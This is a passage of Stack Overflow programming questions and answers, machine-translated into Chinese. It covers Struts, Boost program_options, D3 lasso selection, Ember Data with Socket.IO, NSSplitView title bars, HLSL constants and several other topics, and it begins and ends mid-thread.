f(x) = 2(0 - 0.6ρ [1] ) - 1(0 - 0.8ρ [1] ) ² + 2(0 - 0.8ρ [1] )(0 - 0.6ρ [1] ) - 2(0 - 0.6ρ [1] ) ²

如您所见，如果我们进一步求解，我们最终会找到 ρ [1的值]

那么现在的问题是如何编写一个程序来解决这种问题并在Java中获得ρ [1]的值 ，或者是否已经编写了这样的程序？我已经尝试了很多东西，但无法提出解决方案。

任何帮助将不胜感激。谢谢

*   杰维森

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:22:08.730

在我看来，您需要完成 f(x) 的开发，使其变为 ax^2 + bx + c = 0 的形式

然后用这个来解决：[http ://www.web-formulas.com/Math_Formulas/Algebra_Polynomials_Second_Degree.aspx](http://www.web-formulas.com/Math_Formulas/Algebra_Polynomials_Second_Degree.aspx)

这不是一个真正的Java问题。一旦你有了解决方案的方程，它就会很容易编写。

# iphone - 使用 UIViewAnimationOptionTransitionCurlUp 动画重新加载 UIView

> ID：15092676
> 
> 赞同：0
> 
> 时间：2013-02-26T15:16:47.620
> 
> 标签：iphone, objective-c, uiview

我需要使用 UIViewAnimationOptionTransitionCurlUp 动画重新加载（更新）self.view。在视觉上，旧视图以卷曲效果进行动画处理，并且在其后呈现新的更新视图。我找不到比创建当前视图的屏幕截图更好的方法，将其放在最上面，然后应用动画将其卷起并删除。然后在旧视图卷起后，更新的视图元素会很好地呈现。

但是，卷曲不起作用。过渡变得淡出而不是卷曲。怎么了？代码如下。

```
UIGraphicsBeginImageContextWithOptions(self.view.frame.size, NO, 0.0);
[self.view.layer renderInContext:UIGraphicsGetCurrentContext()];
UIImage *screenshot = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();

UIView* screenView = [[UIView alloc] initWithFrame:self.view.frame];
screenView.tag = TAG_SCREENSHOT_VIEW;
screenView.backgroundColor = [UIColor colorWithPatternImage:screenshot];
[self.view addSubview:screenView];
[screenView.superview bringSubviewToFront:screenView];

[UIView transitionWithView:screenView
                  duration:1.0f
                   options:UIViewAnimationOptionTransitionCurlUp
                animations:^ { screenView.alpha = 0.0f; }
                completion:^ (BOOL finished) {
                    [screenView removeFromSuperview];
                }]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T16:04:30.550

这是正确的版本：

```
[UIView transitionWithView:self.view
                  duration:0.5f
                   options:UIViewAnimationOptionTransitionCurlUp
                animations:^ { [screenView removeFromSuperview]; }
                completion:nil]; 
```

transitionWithView 是 self.view 和动画块应该删除**screenView**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:32:11.977

`alpha`您实际上是通过在动画中将其归零来淡出您的视图。

尝试在动画块中添加子视图（并且仅在此处）以使视图添加动画：

```
[UIView transitionWithView:self.view
              duration:1.0f
               options:UIViewAnimationOptionTransitionCurlUp
            animations:^ { [self.view addSubview:screenView]; screenView.alpha = 0.0f; }
            completion:^ (BOOL finished) {
                [screenView removeFromSuperview];
            }]; 
```

无论如何，我不确定我能理解那里在`screenView.alpha = 0.0f;`做什么。可能以下内容更接近您想要实现的目标（在这种情况下，您需要在执行动画之前添加子视图）：

```
[UIView transitionWithView:self.view
              duration:1.0f
               options:UIViewAnimationOptionTransitionCurlUp
            animations:^ { [screenView removeFromSuperview]; }
            completion:nil]; 
```

# javascript - 传递参数的终端错误

> ID：15092677
> 
> 赞同：1
> 
> 时间：2013-02-26T15:16:51.250
> 
> 标签：javascript, command-line, complexity-theory, plato

[Plato](https://github.com/jsoverson/plato)是一个 JS 代码复杂度分析器。

该文档可以在该链接中找到。但是我无法让它运行。这一定是一个愚蠢的错误，但这是我尝试过的。

```
plato fileX.js -d somename "~/Desktop/"
plato addNewDocPopup.js -d "~/Desktop/" 
```

在许多其他人中:) 我并不声称在命令行上很出色，但我得到的错误是：
`Must specify a value for option d (dir : The output directory)`

我可以发誓这正是我正在做的......也许不是......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:48:27.400

只是一个猜测，但也许选项必须在目标文件之前？`plato -d ~/Desktop fileX.js`. 另外，不要加`~/Desktop`双引号。这将阻止 shell 为您扩展`~`到您的主目录的路径中。

# java - struts 逻辑标签的属性和值属性

> ID：15092678
> 
> 赞同：0
> 
> 时间：2013-02-26T15:16:52.640
> 
> 标签：java, jsp, struts

在这里尝试了解一些基本的 Struts：

`<logic:equal name="myForm" property="myFlag" value="Y">`

我从遗留代码中了解到，Java 类中调用`myFlag`了一个 String 变量。`myForm`但是，您能否以相同的方式将变量传递给`value`换句话说：

`<logic:equal name="myForm" property="myFlag" value="secretJavaValue">`

在`myForm`Java 类中，我们有：

```
String myFlag = "";
final String secretJavaValue = "iLoveC";
getMyFlag();
setMyFlag(String flag); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T16:10:53.040

你可以试试：

```
<logic:equal name="myForm" property="myFlag" value="<%=secretJavaValue%>"> 
```

中的属性值*始终*是文字值。`value`[`logic:equal`](http://struts.apache.org/development/1.x/apidocs/org/apache/struts/taglib/logic/package-summary.html#doc.Properties)

# java - Struts2：如何在 ActionSupport 中获取 ServletRequest 实例

> ID：15092680
> 
> 赞同：5
> 
> 时间：2013-02-26T15:16:58.680
> 
> 标签：java, javascript, ajax, json, struts2

如何`ServletRequest`在我的操作中获取实例？

我实现`ServletRequestAware`了，但我无法在操作中获取请求对象。

struts.xml

```
<package name="default" extends="struts-default,json-default">
    <action name="Cart"
    class="struts.cart.action.CartAction">
        <interceptor-ref name="json">
            <param name="contentType">application/json</param>
        </interceptor-ref>
        <result type="json"/> 
    </action>   
</package> 
```

我正在使用 Ajax/JavaScript 拨打电话：

```
req.onreadystatechange = onReadyState;  
req.open(POST, Cart.action, false);  
req.setRequestHeader("Content-Type", "application/json; charset=utf-8");  
req.send(JSONstr); 
```

JSON对象：

```
var data = { cartItem: {
     modelNo: $('#modelNo').val(),
     description: $('#description').val(),
     price: $('#price').val(),
     action: $('#action').val(),
     quantity: $('#quantity').val()
}};
JSONstr = JSON.stringify(data); 
```

行动：

```
public class CartAction extends ActionSupport implements  ServletRequestAware {

    private HttpServletRequest request;
    private Map cartItem = new HashMap();

    public String execute() throws Exception {
        System.out.println("request  " + cartItem); // getting here cartitem
        System.out.println("request  " + request);  // request  null 
    }

    public void setServletRequest(HttpServletRequest httpServletRequest) {
        this.request = httpServletRequest;
    }

    public Map getCartItem() {
        return cartItem;
    }

    public void setCartItem(Map cartItem) {
        this.cartItem = cartItem;
    }

} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-26T15:31:46.990

尝试这个

```
HttpServletRequest request = ServletActionContext.getRequest() ; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-26T16:23:55.650

1.  为什么*需要*servlet 请求？很少有它是必需的。
2.  ServletRequestAware 不起作用的原因是您删除了将其设置为操作的拦截器：

```
<action name="Cart" class="struts.cart.action.CartAction">
  <interceptor-ref name="json">
    <param name="contentType">application/json</param>
  </interceptor-ref>
  <result type="json"/> 
</action> 
```

在操作配置中设置*任何拦截器时，您必须设置**所有*拦截器。

在这里，您*删除*了所有默认拦截器，包括设置操作请求的“servletConfig” ，并且*只*`ServletRequestAware`运行拦截器。*`json`*

 ** * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-28T07:17:11.747

您可以通过这种方式使用 AjaxActionSupport 而不是 ActionSupport..

```
public class TestAjaxAction extends AJAXActionSupport { 
```

//在这里面你有执行方法，你可以很容易地得到两个对象。

> 公共无效执行（HttpServletRequest 请求，HttpServletResponse 响应）抛出 AJAXActionException {*

# javascript - 通过在它们周围进行手绘来选择 SVG 元素

> ID：15092686
> 
> 赞同：6
> 
> 时间：2013-02-26T15:17:12.127
> 
> 标签：javascript, html, d3.js, svg

我正在做一个项目，我想在一些 SVG 元素周围画一条线，以便选择该区域内的对象。

这是我现在拥有的屏幕截图。我使用 Paint 来添加线条，以便完全清楚我想要实现的目标。我想`rect`在绘制的圆圈内选择两个。

[![截屏](../Images/06af095938a6297e2593bdd7af02a6e2.png)](https://i.stack.imgur.com/njNdp.png)

我看到一些必须解决的步骤：

1.  在处创建一个`path`元素`mousedown`并记录鼠标移动，直到`mouseup`
2.  关闭`path`, 以防用户没有画圆
3.  查找完全或部分在圆圈内的 svg 元素

你看到了哪些方法，你对如何去做有什么建议吗？

我正在使用[D3.js](https://d3js.org/)。这张[幻灯片](https://mbostock.github.io/d3/talk/20110921/ribbon.html)（由 D3 的创建者 Mike Bostock 提供）可能会很有趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:39:12.237

我会执行以下步骤：

1.  获得手绘形式的 aabb（或最小/最大框），
2.  找到 aabb 与自由形式重叠的所有元素并将其保存在列表中，
3.  得到手绘形式的凸包，
4.  测试列表元素中的每个或某些顶点是否位于凸包内

根据您是否测试所有顶点都位于凸包内，您可以确定元素是完全位于手绘图内还是仅与它重叠。

不幸的是，我对 d3.js 不太熟悉，但只是猜测它提供了获取凸包、aabbs 和测试点以位于多边形内的方法。可能它甚至为您提供了在步骤 2 中进行 aabb 查询以查找重叠 aabb 的能力。

祝你好运...

# silverlight - Silverlight 测试项目 - 发现同一依赖程序集的不同版本之间存在冲突

> ID：15092688
> 
> 赞同：1
> 
> 时间：2013-02-26T15:17:16.580
> 
> 标签：silverlight, build, msbuild, castle-windsor, moq

我有一个 Silverlight 项目，我将`Castle Windsor 3.2`其用作我的`DI container`.
我的测试项目是一个`Silverlight class library`，我`Moq`用来模拟我的界面。

`Moq`依赖于对 的引用`Castle Core 2.5`。到目前为止没问题，我的应用程序在 3.2 版本上运行良好，我的测试在 2.5 版本上运行正常。
尽管会产生警告：`found conflicts between different versions of the same dependent assembly`.
仍然一切正常。

现在，我们使用 CruiseControl 进行部署，并将其配置为将此警告视为错误，并且我的构建部署失败。

我已经尝试过使用`Moq`新版本的作品，`Castle.Core`但不幸的是它没有。

我似乎无法添加重定向，因为我的`Silverlight`测试项目没有 app.config 文件。

将该`<NoWarn>`部分添加到我的 vb.proj 文件时，警告会在构建我的解决方案时消失。但是`CruiseControl`使用`MSBuild`它并不能识别警告号码。

任何建议如何解决这个问题？

# c++ - Boost parse_config_file，空键值

> ID：15092689
> 
> 赞同：13
> 
> 时间：2013-02-26T15:17:29.547
> 
> 标签：c++, boost, boost-program-options

我正在使用 Boost program_options 以标准方式解析配置文件，如
program_options 的 multiple_sources.cpp 示例文件所示。

```
 ifstream ini_file("config.ini");  
    po::store(po::parse_config_file(ini_file, desc, true), vm);  
    po::notify(vm); 
```

然而，config.ini 文件有空的键=值对，例如：

```
key1=value1  
key2=value2  
key3=  
key4=  
key5=value5 
```

尝试读取此文件会导致 Boost 错误：

```
boost::program_options::invalid_option_value 
```

boost::program_options 中是否有任何机制来读取这些带有空整的配置文件？

任何帮助将非常感激。

* * *

我正在编辑此问题，因为问题尚未解决。我将仅引用 Boost (1.53) 中的示例。

这是完整的 multiple_sources.cpp 文件：

```
#include <boost/program_options.hpp>
namespace po = boost::program_options;

#include <iostream>
#include <fstream>
#include <iterator>
using namespace std;

// A helper function to simplify the main part.
template<class T>
ostream& operator<<(ostream& os, const vector<T>& v)
{
    copy(v.begin(), v.end(), ostream_iterator<T>(os, " ")); 
    return os;
}

int main(int ac, char* av[])
{
    try {
        int opt;
        string config_file;

        // Declare a group of options that will be 
        // allowed only on command line
        po::options_description generic("Generic options");
        generic.add_options()
            ("version,v", "print version string")
            ("help", "produce help message")
            //("optimization","optimization level")      
            ("config,c", po::value<string>(&config_file)->default_value("multiple_sources.cfg"),
                  "name of a file of a configuration.")
            ;

        // Declare a group of options that will be 
        // allowed both on command line and in
        // config file
        po::options_description config("Configuration");
        config.add_options()
            ("optimization", po::value<int>(&opt)->default_value(10), 
                  "optimization level")
            ("include-path,I", po::value< vector<string> >()->composing(), 
                 "include path")
            ;

        // Hidden options, will be allowed both on command line and
        // in config file, but will not be shown to the user.
        po::options_description hidden("Hidden options");
        hidden.add_options()
            ("input-file", po::value< vector<string> >(), "input file")
            ;

        po::options_description cmdline_options;
        cmdline_options.add(generic).add(config).add(hidden);

        po::options_description config_file_options;
        config_file_options.add(config).add(hidden);

        po::options_description visible("Allowed options");
        visible.add(generic).add(config);

        po::positional_options_description p;
        p.add("input-file", -1);

        po::variables_map vm;
        store(po::command_line_parser(ac, av).
              options(cmdline_options).positional(p).run(), vm);
        notify(vm);

        ifstream ifs(config_file.c_str());
        if (!ifs)
        {
            cout << "can not open config file: " << config_file << "\n";
            return 0;
        }
        else
        {
            store(parse_config_file(ifs, config_file_options), vm);
            notify(vm);
        }

        if (vm.count("help")) {
            cout << visible << "\n";
            return 0;
        }

        if (vm.count("version")) {
            cout << "Multiple sources example, version 1.0\n";
            return 0;
        }

        if (vm.count("include-path"))
        {
            cout << "Include paths are: " 
                 << vm["include-path"].as< vector<string> >() << "\n";
        }

        if (vm.count("input-file"))
        {
            cout << "Input files are: " 
                 << vm["input-file"].as< vector<string> >() << "\n";
        }

        cout << "Optimization level is " << opt << "\n";                
    }
    catch(exception& e)
    {
        cout << e.what() << "\n";
        return 1;
    }    
    return 0;
} 
```

而对应的配置文件（multiple_sources.cfg）为：

```
#
# Comment out this line to use hard-coded default value of 10
# 
optimization = 1
include-path = /opt 
```

如果现在将此文件修改为：

```
#
# Comment out this line to use hard-coded default value of 10
# 
optimization = 
include-path = /opt 
```

抛出以下错误消息：

```
the argument for option 'optimization' is invalid 
```

具有验证重载等的建议解决方案似乎不必要地复杂，特别是因为可能必须为每种数据类型编写验证函数，并结合识别“\ n”其他空白的可能性。

有什么建议么？感谢大家抽出宝贵的时间。

* * *

按照 Aditya 的建议，我替换了以下行：

```
 ("optimization", po::value<int>(&opt)->default_value(10), 
                  "optimization level") 
```

具有以下内容：

```
 ("optimization", po::value<int>(&opt)->zero_tokens(), 
                  "optimization level") 
```

和 ：

```
 ("optimization", po::value<int>(&opt)->implicit_value(10), 
                  "optimization level") 
```

他们都没有阅读空白选项。Boost 示例程序“parser_test.cpp”通过将键值对读入向量中绕过了 zero_tokens() 或implicit_value() 的使用，如下所示：

```
void test_config_file(const char* config_file)
{
    options_description desc;
    desc.add_options()
        ("gv1", new untyped_value)
        ("gv2", new untyped_value)
        ("empty_value", new untyped_value)
        ("plug*", new untyped_value)
        ("m1.v1", new untyped_value)
        ("m1.v2", new untyped_value)
        ("b", bool_switch())
    ;

    const char content1[] =
    " gv1 = 0#asd\n"
    "empty_value = \n"
    "plug3 = 7\n"
    "b = true\n"
    "[m1]\n"
    "v1 = 1\n"
    "\n"
    "v2 = 2\n"    
    ;

    vector<option> a2 = parse_config_file<char>(config_file, desc).options;
    BOOST_REQUIRE(a2.size() == 6);
    check_value(a2[0], "gv1", "0");
    check_value(a2[1], "empty_value", "");
    check_value(a2[2], "plug3", "7");
    check_value(a2[3], "b", "true");
    check_value(a2[4], "m1.v1", "1");
    check_value(a2[5], "m1.v2", "2");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T14:08:24.347

我建议你用 try/catch 这个异常包围，并且只为那些对你的程序真正必要并且不能为空的字段抛出错误，否则该字段将被忽略。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-09T16:34:45.713

不，目前没有办法在 boost::program_options 中处理这个问题。在 INI 文件中有一个空的键：值对与在命令行上指定选项而不提供参数相同。ypnos 建议的编写自定义验证器的方法可能有效，但似乎不切实际，因为您需要将其应用于您期望的每个选项，可能会留空。您必须编写自己的 po::parse_config_file 实现，它会忽略没有值的行（除非相应的选项被标记为 zero_token）以获得您正在寻找的结果。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-09-05T16:19:28.830

我多次偶然发现这个问题，最后通过从初始 INI 文件中删除无效行，然后将其传递给`program_options::parse_config_file`. 可以通过在文件系统上创建一个临时修改的 INI 文件或将整个原始 INI 文件读取到内存并在那里修改它，然后创建`istringstream`以传递给`parse_config_file`.

[`boost::iostreams`](https://www.boost.org/doc/libs/1_68_0/libs/iostreams/doc/index.html)我个人为此创建了一个过滤流类来动态过滤`ifstream`。这不会创建任何新的依赖项，因为我已经使用了 Boost，并且`boost::iostreams`在我的情况下只能使用标头。

这是它的使用方式：

```
#include <fstream>
#include <boost/iostreams/filtering_stream.hpp>
#include <boost/program_options.hpp>
#include "inifilefilter.h" // IniFileInputFilter
...
std::ifstream file("config.ini");
if (file)
{
   // filtering out empty values, i.e. name=
   boost::iostreams::filtering_istream filteredIniFile; 
   filteredIniFile.push(IniFileInputFilter());
   filteredIniFile.push(file);
   po::parsed_options parsedFileOpts =
         po::parse_config_file(filteredIniFile, configFileOptions, true);
   ...
} 
```

我不会从`inifilefilter.h`这里展示代码，因为它对所有检查和极端情况都有些冗长，但同时它的想法很简单。' `IniFileInputFilter`s`read()`方法缓冲每个输入行，然后在行尾仅在有效时才进一步传递该行。“有效”意味着它要么是一行，要么在第一行和行尾`[section]`之间有一些非空格字符。`'='`

# c# - 使代码分析停止对某个变量名称的警告

> ID：15092692
> 
> 赞同：7
> 
> 时间：2013-02-26T15:17:44.870
> 
> 标签：c#, .net, code-analysis

我有一个名为 like 的变量`allowedZHs`。`ZH`是特定领域的首字母缩写词。`ZHs`是它的复数形式。我想继续使用那个复数形式。我发现它比“正确”形式“ `Zhs`”更具表现力。
我试图通过添加[Code Analysis Dictionary](http://msdn.microsoft.com/en-us/library/bb514188.aspx)来告诉 Code Analysis 。这适用于单数形式“ `ZH`”，但不适用于复数形式。
我仍然收到警告[CA1704](http://msdn.microsoft.com/en-us/library/bb264492.aspx)。

我尝试将其添加为可识别的单词并将其添加为首字母缩略词：

```
<Dictionary>
  <Words>
    <Recognized>
      <Word>ZHs</Word>
    </Recognized>
  </Words>
  <Acronyms>
    <CasingExceptions>
      <Acronym>ZHs</Acronym>
    </CasingExceptions>
  </Acronyms>
</Dictionary> 
```

任何想法我做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T18:00:59.663

坏消息是，在较旧的 FxCop 版本中，无法使用字典来允许复数首字母缩略词。（例如，参见 Kevin Blasko 在[http://social.msdn.microsoft.com/Forums/eu/vstscode/thread/56af1337-895d-47ec-ac72-71cf0316ea60 上的回答。](http://social.msdn.microsoft.com/Forums/eu/vstscode/thread/56af1337-895d-47ec-ac72-71cf0316ea60.)）好消息是发布的版本VS 2012 允许它们开箱即用，因此当您最终升级时甚至不需要触摸字典。

# node.js - 如何从 Socket.IO 响应中将数据加载到 Ember Data 中？

> ID：15092695
> 
> 赞同：2
> 
> 时间：2013-02-26T15:17:51.037
> 
> 标签：node.js, ember.js, socket.io, ember-data

我正在编写一个利用 Ember.js、Ember Data 和通过 Node.js 的 Socket.IO 的应用程序。我试图找出从套接字响应接收数据并将其加载到我的 Ember 数据存储中的最佳方法，例如：

```
window.socket = io.connect('http://localhost');

socket.on('action here', function(response) {
  // how to load "response" JSON data into Ember Data store from here...?
}); 
```

编写自定义 DS.Adapter 是最好的（或唯一好的）解决方案吗？还是有另一种好的、可维护的方式来实现这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T15:21:21.313

最好的方法是编写自己的适配器，但如果您只需要加载模型（不保存），您可以使用适配器的`load`方法 - 如下所示：

```
socket.on('single-model', function(response) {
    DS.defaultStore.load(response);
});

socket.on('multiple-models', function(response) {
    for(i in response){
        DS.defaultStore.load(response[i]);
    }
}); 
```

将适配器定义为`FixtureAdaptor`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T13:10:17.937

作为记录，我最终选择了这里提出的答案：

[https://stackoverflow.com/a/14508316/1470194](https://stackoverflow.com/a/14508316/1470194)

使用 Ember.Instrumentation 技术，我能够方便地调用我的控制器并以这种方式访问​​我的商店。

我意识到在许多情况下可能需要编写自定义适配器，但这超出了我项目所需的范围，所以这个解决方案最终是完美的。

# hadoop - 将 Akubra-HDFS 与 Cloudera CDH4 一起使用

> ID：15092712
> 
> 赞同：1
> 
> 时间：2013-02-26T15:18:42.843
> 
> 标签：hadoop, storage, hdfs, cloudera, fedora-commons

我正在尝试使用[Akubra-HDFS作为](http://wiki.opf-labs.org/display/SP/akubra-hdfs)[Fedora 公共](http://fedora-commons.org/)服务器的低级存储。我按照类似于[安装 IRODS](https://www.irods.org/index.php/Fedora)的过程来设置 Akubra-HDFS。fedora 服务器使用 Hadoop（版本 1.0.4）作为其存储。但是，我在将 Akubra-HDFS 库与 Cloudera CDH4 / Apache Hadoop 2.0.3alpha - 高可用性 (HA) 发行版一起使用时遇到了麻烦。我想分享我的发现。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:18:42.843

由于 AKubra-HDFS 是一个新的实验库，因此互联网上没有太多关于它的资源。我必须通过尝试不同的依赖 jar 来找出解决方案。

按照[https://github.com/fasseg/akubra-hdfs上的说明进行操作](https://github.com/fasseg/akubra-hdfs)

将下面的 jar 文件从 CDH4（安装文件夹）复制到 fedora lib 文件夹，而不是为 Hadoop 1.xx 列出的 jar。

1.  commons-cli-1.2.jar
2.  commons-configuration-1.6.jar
3.  commons-lang-2.4.jar
4.  *   google-collections-1.0-rc2.jar（必须从 fedora lib 文件夹中删除）。
5.  guava-11.0.2.jar（这是 google-collections 的较新版本）
6.  hadoop-auth-2.0.0-cdh4.1.3.jar
7.  hadoop-common-2.0.0-cdh4.1.3.jar
8.  hadoop-hdfs-2.0.0-cdh4.1.3.jar
9.  protobuf-java-2.4.0a.jar

# php - 用数组中的变量替换字符串文本

> ID：15092737
> 
> 赞同：0
> 
> 时间：2013-02-26T15:19:39.800
> 
> 标签：php, notifications

我正在为我正在开发的游戏开发通知系统。

我决定将消息存储为字符串，并设置“变量”以替换为通过数组接收到的数据。

消息示例：

`This notification will display !num1 and also !num2`

我从查询中收到的数组如下所示：

```
[0] => Array
    (
        [notification_id] => 1
        [message_id] => 1
        [user_id] => 3
        [timestamp] => 2013-02-26 09:46:20
        [active] => 1
        [num1] => 11
        [num2] => 23
        [num3] => 
        [message] => This notification will display !num1 and also !num2
    ) 
```

我想要做的是将 !num1 和 !num2 替换为数组 (11, 23) 中的值。

消息在来自`message_tbl`. 我想棘手的部分`num3`是存储为空。

我试图将所有不同类型消息的所有通知存储在 2 个表中。

另一个例子是：

```
[0] => Array
    (
        [notification_id] => 1
        [message_id] => 1
        [user_id] => 3
        [timestamp] => 2013-02-26 09:46:20
        [active] => 1
        [num1] => 11
        [num2] => 23
        [num3] => 
        [message] => This notification will display !num1 and also !num2
    )
[1] => Array
    (
        [notification_id] => 2
        [message_id] => 2
        [user_id] => 1
        [timestamp] => 2013-02-26 11:36:20
        [active] => 1
        [num1] => 
        [num2] => 23
        [num3] => stringhere
        [message] => This notification will display !num1 and also !num3
    ) 
```

PHP中有没有办法用数组中的正确值成功替换 !num(x) ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:22:43.330

这里：

```
$replacers = array(11, 23);
foreach($results as &$result) {
    foreach($replacers as $k => $v) {
        $result['message'] = str_replace("!num" . $k , $v, $result['message']);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:23:18.120

您可以使用正则表达式和自定义回调来执行此操作，如下所示：

```
$array = array( 'num1' => 11, 'num2' => 23, 'message' => 'This notification will display !num1 and also !num2');
$array['message'] = preg_replace_callback( '/!\b(\w+)\b/', function( $match) use( $array) {
    return $array[ $match[1] ];
}, $array['message']); 
```

你可以从[这个演示](http://viper-7.com/Wc8Kts)中看到这个输出：

```
This notification will display 11 and also 23 
```

# objective-c - INAppStoreWindow 标题栏上的 NSSplitView 分隔线

> ID：15092738
> 
> 赞同：7
> 
> 时间：2013-02-26T15:19:39.997
> 
> 标签：objective-c, macos, cocoa, nssplitview, inappstorewindow

我正在尝试创建一个类似 Reeder/Sparrow 的 UI 来处理我的应用程序的内容。目前我使用一个带有两个 NSView 的 NSSplitView（左边的一个是内容列表，另一个是“检查器”）。

我想知道的是如何在标题栏上创建分隔线，它也可以作为拆分视图的分隔线。我已经在使用[INAppStoreWindow](https://github.com/indragiek/INAppStoreWindow)子类了。

有任何想法吗？提前感谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-26T17:39:07.977

我这样做的方法是添加一个 NSSplitView 子类作为 INAppStoreWindow 的 tileBarView 的子视图：

```
// This code comes from the INAppStoreWindow readme
INAppStoreWindow *appStoreWindow = (INAppStoreWindow *)[self window];

// self.titleView is a an IBOutlet to an NSView that has been configured in IB with everything you want in the title bar
self.windowTitleBarView.frame = appStoreWindow.titleBarView.bounds;
self.windowTitleBarView.autoresizingMask = NSViewWidthSizable | NSViewHeightSizable;
[appStoreWindow.titleBarView addSubview:self.windowTitleBarView]; 
```

两个棘手的部分是让这个拆分视图表现得像一个标题栏（即仍然允许您拖动窗口），并将标题栏中的拆分视图与窗口中的主拆分视图同步，所以它们看起来像对用户来说同样的事情。

要解决第一个问题，您必须做的不仅仅是`-mouseDownCanMovewWindow`在标题栏 NSSplitView 子类中返回 YES。如果您这样做，则磁贴栏的任何子视图都不会响应鼠标事件。相反，请执行以下操作：

```
@implementation MyTitleBarSplitView

- (BOOL)mouseDownCanMoveWindow
{
    return NO;
}

// Code below adapted from http://www.cocoabuilder.com/archive/cocoa/219261-conditional-mousedowncanmovewindow-for-nsview.html
- (void)mouseDown:(NSEvent*)theEvent 
{
    NSWindow *window = [self window];
    NSPoint mouseLocation = [theEvent locationInWindow];
    NSRect dividerRect = NSMakeRect(NSMaxX([[[self subviews] objectAtIndex:0] frame]), 
                                    NSMinY([self bounds]), 
                                    [self dividerThickness], 
                                    NSHeight([self bounds]));
    dividerRect = NSInsetRect(dividerRect, -2, 0);
    NSPoint mouseLocationInMyCoords = [self convertPoint:mouseLocation fromView:nil];
    if (![self mouse:mouseLocationInMyCoords inRect:dividerRect]) 
    {
        mouseLocation = [window convertBaseToScreen:mouseLocation];
        NSPoint origin = [window frame].origin;
        // Now we loop handling mouse events until we get a mouse up event.
        while ((theEvent = [NSApp nextEventMatchingMask:NSLeftMouseDownMask|NSLeftMouseDraggedMask|NSLeftMouseUpMask untilDate:[NSDate distantFuture] inMode:NSEventTrackingRunLoopMode dequeue:YES])&&([theEvent type]!=NSLeftMouseUp)) 
        {
            @autoreleasepool 
            {
                NSPoint currentLocation = [window convertBaseToScreen:[theEvent locationInWindow]];
                origin.x += currentLocation.x-mouseLocation.x;
                origin.y += currentLocation.y-mouseLocation.y;
                // Move the window by the mouse displacement since the last event.
                [window setFrameOrigin:origin];
                mouseLocation = currentLocation;
            }
        }
        [self mouseUp:theEvent];
        return;
    }

    [super mouseDown:theEvent];
}

@end 
```

第二个任务是同步两个拆分视图。使您的控制器类（可能是窗口控制器，但在您的代码中有意义的）成为您的主要内容拆分视图和标题栏拆分视图的代表。然后，实现下面的两个 NSSplitView 委托方法：

```
@implementation MyController
{
    BOOL updatingLinkedSplitview;
}

- (CGFloat)splitView:(NSSplitView *)splitView constrainSplitPosition:(CGFloat)proposedPosition ofSubviewAt:(NSInteger)dividerIndex
{
    // If already updating a split view, return early to avoid infinite loop and stack overflow
    if (updatingLinkedSplitview) return proposedPosition;

    if (splitView == self.mainSplitView)
    {
        // Main splitview is being resized, so manually resize the title bar split view
        updatingLinkedSplitview = YES;
        [self.titleBarSplitView setPosition:proposedPosition ofDividerAtIndex:dividerIndex];
        updatingLinkedSplitview = NO;
    }
    else if (splitView == self.titleBarSplitView)
    {
        // Title bar splitview is being resized, so manually resize the main split view
        updatingLinkedSplitview = YES;
        [self.mainSplitView setPosition:proposedPosition ofDividerAtIndex:dividerIndex];
        updatingLinkedSplitview = NO;
    }

    return proposedPosition;
}

- (void)splitView:(NSSplitView *)splitView resizeSubviewsWithOldSize:(NSSize)oldSize
{
    // This is to synchronize the splitter positions when the window is first loaded
    if (splitView == self.titleBarSplitView)
    {
        NSRect leftFrame = NSMakeRect(NSMinX([self.leftTitleBarView frame]),
                                      NSMinY([self.leftTitleBarView frame]),
                                      NSWidth([self.leftMainSplitView frame]),
                                      NSHeight([self.leftTitleBarView frame]));
        NSRect rightFrame = NSMakeRect(NSMaxX(leftFrame) + [splitView dividerThickness],
                                      NSMinY([self.rightTitleBarView frame]),
                                      NSWidth([self.rightMainSplitView frame]),
                                      NSHeight([self.rightTitleBarView frame]));

        [self.leftTitleBarView setFrame:leftFrame];
        [self.rightTitleBarView setFrame:rightFrame];
    }
} 
```

# directx - 设置 HLSL 常量的方法

> ID：15092739
> 
> 赞同：2
> 
> 时间：2013-02-26T15:19:42.533
> 
> 标签：directx, constants, shader, vertex-shader

有没有办法从opengl风格的c ++代码中设置HLSL（例如）顶点着色器常量？我的意思是 - 没有 d3dx，没有常量表。着色器已使用 fxc.exe 编译并设置。只有 LPDIRECT3DVERTEXSHADER9 和 LPDIRECT3DDEVICE9。我计划使用`SetVertexShaderConstant`*，但找不到将常量名称（例如“u_mvpMatrix”）转换为“将包含第一个常量值的寄存器号”的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T03:02:53.743

您需要将常量绑定到着色器文件中的寄存器。例如。

```
float4 sample_constant : register(c12); 
```

这会将 sample_constant 绑定到寄存器 12。然后，您可以使用 SetVertexShaderConstant() 设置使用 12 作为寄存器的常量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-05T14:22:40.627

您可以使用[ID3DXConstantTable](http://msdn.microsoft.com/en-us/library/bb205762(v=vs.85).aspx) API 按名称设置常量。例如，如果您在着色器中`float4`调用了一个常量`cameraPos`，您可以从 C/C++ 中设置它，如下所示：

```
float val[4] = {0,1,0,1};
D3DXHANDLE camposHandle = consttab->GetConstantByName(NULL, "cameraPos");
